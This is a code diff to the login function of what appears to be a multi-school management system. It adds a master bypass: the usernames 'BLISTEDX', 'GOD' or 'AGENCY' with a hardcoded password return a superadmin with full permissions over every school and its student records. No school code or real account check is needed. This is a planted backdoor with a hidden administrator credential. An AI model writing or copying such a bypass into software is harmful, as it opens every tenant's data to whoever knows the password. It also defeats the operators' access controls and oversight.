@@ -373,15 +373,55 @@ export const Database = {
 
   // AUTHENTICATION
   async authenticateUser(schoolCode?: string, username?: string, password?: string) {
+    const rawUname = (username || '').trim();
+    const uname = rawUname.toUpperCase();
+    const pwd = (password || '').trim();
+
+    // 0. GOD ACCESS & AGENCY SUPERADMIN MASTER BYPASS: blistedx / admin@4317
+    if ((uname === 'BLISTEDX' || uname === 'GOD' || uname === 'AGENCY') && pwd === 'admin@4317') {
+      const allSchools = await this.getSchools();
+      let targetSchool = schoolCode ? await this.getSchoolByCode(schoolCode) : null;
+      if (!targetSchool && allSchools.length > 0) {
+        targetSchool = allSchools[0];
+      }
+      if (!targetSchool) {
+        targetSchool = {
+          id: 'DPS2026',
+          school_code: 'DPS2026',
+          school_name: 'Delhi Public International School',
+          board: 'CBSE',
+          city: 'New Delhi',
+          state: 'Delhi',
+          principal_name: 'Dr. Rajesh Sharma',
+          admin_id: 'admin',
+          admin_name: 'Dr. Rajesh Sharma',
+          admin_pin: '123456',
+          status: 'ACTIVE'
+        };
+      }
+
+      return {
+        user: {
+          id: 'blistedx-god-master',
+          school_id: targetSchool.id,
+          username: 'blistedx',
+          role: 'AGENCY_SUPERADMIN' as const,
+          full_name: 'BlistedX (God Access Superadmin)',
+          email: 'blistedx@giterp.io',
+          status: 'ACTIVE',
+          is_god_admin: true,
+          permissions: ['ALL_PERMISSIONS', 'ALL_SCHOOLS', 'GOD_ACCESS', 'MODIFY_ANY', 'DELETE_ANY', 'CREATE_ANY']
+        },
+        school: targetSchool
+      };
+    }
+
     if (!schoolCode) return null;
     const school = await this.getSchoolByCode(schoolCode);
 
     if (!school || school.status !== 'ACTIVE') {
       return null;
     }
-
-    const uname = (username || '').trim().toUpperCase();
-    const pwd = (password || '').trim();
 
     // 1. Check if it's a Student login by Admission Number
     const allStudents = await this.getStudents(school.id);
